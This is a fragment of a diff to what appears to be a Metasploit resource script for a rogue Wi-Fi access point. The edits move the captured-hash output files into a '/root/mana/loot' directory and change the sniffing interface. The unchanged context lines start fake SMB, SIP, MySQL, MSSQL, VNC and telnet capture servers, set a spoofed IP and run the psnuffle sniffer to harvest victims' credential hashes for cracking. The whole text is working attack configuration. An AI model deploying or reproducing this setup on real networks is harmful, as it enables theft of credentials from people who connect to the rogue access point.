@@ -25,11 +25,11 @@ set SPOOFIP 10.0.0.1
 exploit -j
 
 use auxiliary/server/capture/smb
-set JOHNPWFILE /root/rogue-ap/captured-smb-hashes.john
+set JOHNPWFILE /root/mana/loot/captured-smb-hashes.john
 exploit -j
 
 use auxiliary/server/capture/sip
-set JOHNPWFILE /root/rogue-ap/captured-sip-hashes.john
+set JOHNPWFILE /root/mana/loot/captured-sip-hashes.john
 exploit -j
 
 use auxiliary/server/capture/telnet
@@ -47,19 +47,19 @@ exploit -j
 set SRVHOST 0.0.0.0
 
 use auxiliary/server/capture/mysql
-set JOHNPWFILE /root/rogue-ap/captured-mysql-hashes.john
+set JOHNPWFILE /root/mana/loot/captured-mysql-hashes.john
 exploit -j
 
 use auxiliary/server/capture/mssql
-set JOHNPWFILE /root/rogue-ap/captured-mssql-hashes.john
+set JOHNPWFILE /root/mana/loot/captured-mssql-hashes.john
 exploit -j
 
 use auxiliary/server/capture/vnc
-set JOHNPWFILE /root/rogue-ap/captured-vnc-hashes.john
+set JOHNPWFILE /root/mana/loot/captured-vnc-hashes.john
 exploit -j
 
 use auxiliary/server/capture/vnc
-set JOHNPWFILE /root/rogue-ap/captured-vnc-hashes.john
+set JOHNPWFILE /root/mana/loot/captured-vnc-hashes.john
 set SRVPORT 5901
 exploit -j
 
@@ -110,5 +110,5 @@ exploit -j
 #Sniffer
 
 use auxiliary/sniffer/psnuffle
-set INTERFACE wlan7
+set INTERFACE wlan0
 exploit -j
